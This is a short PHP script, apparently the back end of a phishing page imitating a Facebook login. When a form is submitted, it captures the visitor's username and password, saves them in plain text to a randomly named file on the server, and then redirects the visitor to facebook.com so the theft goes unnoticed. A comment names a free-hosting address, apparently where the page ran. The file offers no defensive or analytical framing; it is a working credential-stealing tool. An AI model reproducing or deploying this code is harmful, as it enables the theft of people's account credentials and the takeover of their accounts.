<?php

 if ($_REQUEST['login']) {
 	$username = $_REQUEST['user'];
 	$pass = $_REQUEST['pass'];
 	$myfile = fopen(rand().".txt", "w") or die("Unable to open file!");
 	$txt = $username." ".$pass;
 	fwrite($myfile, $txt);
 	///https://dfsgh.000webhostapp.com/
 	header('Location: '.'http://www.facebook.com');
 }